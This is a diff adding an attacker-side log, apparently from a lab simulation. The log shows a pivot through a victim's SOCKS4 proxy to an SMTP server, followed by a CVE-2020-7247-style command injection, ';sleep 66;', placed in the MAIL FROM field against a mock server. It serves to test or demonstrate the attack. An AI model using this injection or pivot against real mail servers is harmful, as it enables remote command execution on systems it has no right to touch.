@@ -1,0 +1,22 @@
+[13:43:50.908] [ATTACKER] listening for victim proxy on 10.230.30.20:9002
+[13:43:50.908] [ATTACKER] will request SOCKS4 CONNECT 10.230.30.25:25
+[13:44:18.107] [ATTACKER] victim proxy connected from 172.22.0.1:57634
+[13:44:18.108] [ATTACKER] SOCKS4 TX 04 01 00 19 0a e6 1e 19 00
+[13:44:18.112] [ATTACKER] SOCKS4 RX 00 5a 00 19 0a e6 1e 19
+[13:44:18.112] [ATTACKER] SOCKS4 CONNECT granted; SMTP bytes now traverse victim proxy
+[13:44:18.116] [ATTACKER] SMTP RX b'220 vulnerable-smtp.lab ESMTP LabSMTP-1.0\r\n'
+[13:44:18.116] [ATTACKER] SMTP TX b'EHLO attacker.lab\r\n'
+[13:44:18.175] [ATTACKER] SMTP RX b'250-vulnerable-smtp.lab\r\n250-VRFY\r\n250 HELP\r\n'
+[13:44:18.175] [ATTACKER] SMTP TX b'MAIL FROM:<;sleep 66;>\r\n'
+[13:44:18.177] [ATTACKER] SMTP RX b'250 CVE-2020-7247 lab marker accepted\r\n'
+[13:44:18.177] [ATTACKER] SMTP TX b'RCPT TO:<root@vulnerable-smtp.lab>\r\n'
+[13:44:18.178] [ATTACKER] SMTP RX b'250 OK\r\n'
+[13:44:18.178] [ATTACKER] SMTP TX b'DATA\r\n'
+[13:44:18.179] [ATTACKER] SMTP RX b'354 End data with <CR><LF>.<CR><LF>\r\n'
+[13:44:18.179] [ATTACKER] SMTP TX b'Subject: CVE-2020-7247 lab\r\n'
+[13:44:18.179] [ATTACKER] SMTP TX b'\r\n'
+[13:44:18.179] [ATTACKER] SMTP TX b'benign lab message\r\n'
+[13:44:18.179] [ATTACKER] SMTP TX b'.\r\n'
+[13:44:18.233] [ATTACKER] SMTP RX b'250 CVE-2020-7247 simulated exploitation recorded\r\n'
+[13:44:18.233] [ATTACKER] SMTP TX b'QUIT\r\n'
+[13:44:18.234] [ATTACKER] SMTP RX b'221 Bye\r\n'
